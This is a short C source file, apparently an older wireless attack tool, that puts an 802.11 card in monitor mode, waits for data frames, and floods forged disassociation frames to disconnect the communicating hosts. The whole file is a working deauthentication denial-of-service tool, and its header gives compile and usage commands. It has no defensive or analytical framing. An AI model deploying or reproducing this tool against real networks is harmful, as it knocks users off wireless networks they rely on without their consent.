/* by john lampe
program looks for data frames on an 802.11 network and disassociates communicating hosts

compile with gcc -omamasay mamasay.c -lradiate
 
USE:
$ iwpriv wlan0 monitor 1
$ iwconfig wlan0 channel [1-11]
$ ./mamasay 
*/

#include <errno.h>
#include <time.h>
#include <radiate.h>
#include <unistd.h>



int main (int argc, char **argv) {
    radiate_t *context;
    char errbuff[1024];
    u_char *frame;
    u_char *buf;
    int delta,omega,psi,mu,myread,c;
    u_char *bssid;
    u_char *dstmac;
    u_char *srcmac;
    u_char data = RADIATE_REASON_UNSPECIFIED;

    for (mu=0; ; mu += 1) {
        alarm(10);
        delta = omega = 0;

        // keep looping till we get a data frame
        while (delta != 1) { 
            context = radiate_init(0,errbuff);
            if (context == NULL) {fprintf(stderr, "radiate_init failed\n"); exit(0);}
            myread = radiate_read(&buf, context);
            if (myread == -1) {
                fprintf(stderr, "Failed to radiate_read\n");
            } 
            if ( (buf[14] & 0x0F) == 0x08) {           //wait till we get a data frame
                 delta=1;     
            } 
            omega++;
            if (omega > 25) exit(0);                                   
        }


       // order is destmac  bssid srcmac starting at 19th byte of buf[]
       for (psi=0; psi  < 30; psi++) {
           fprintf(stderr, ".");
           frame = radiate_build_mgmt_frame(&(buf[18]),&(buf[30]),&(buf[24]),RADIATE_MGMT_STYPE_DISASSOC,0,(u_char *)&data,sizeof(data),context);
           c = radiate_write(frame, sizeof(struct hfa384x_tx_frame), context);
           if (c == -1) fprintf(stderr, "radiate_write error\n");
           free(frame);
           radiate_set_mm("0", context);
           radiate_set_mm("1", context);
           radiate_set_mm("1", context);
           radiate_destroy(context);
           context = radiate_init(0,errbuff);
           if (context == NULL) {fprintf(stderr, "radiate_init failed\n"); exit(0);}
       }
       alarm(0);
    }  

    return 1;
}




